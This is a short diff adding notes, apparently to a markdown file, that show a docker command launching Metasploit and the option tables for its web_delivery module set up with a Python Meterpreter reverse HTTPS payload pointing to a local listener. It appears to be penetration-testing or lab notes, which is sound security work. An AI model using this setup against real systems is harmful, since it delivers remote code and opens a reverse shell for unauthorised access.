@@ -78,3 +78,28 @@
                                        ·;¿ó…                                                         
 
 ```
+
+
+
+> docker run --rm -it --network host metasploitframework/metasploit-framework
+
+
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (python/meterpreter/reverse_https):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.7      yes       The local listener hostname
+   LPORT  444              yes       The local listener port
+   LURI                    no        The HTTP Path
+
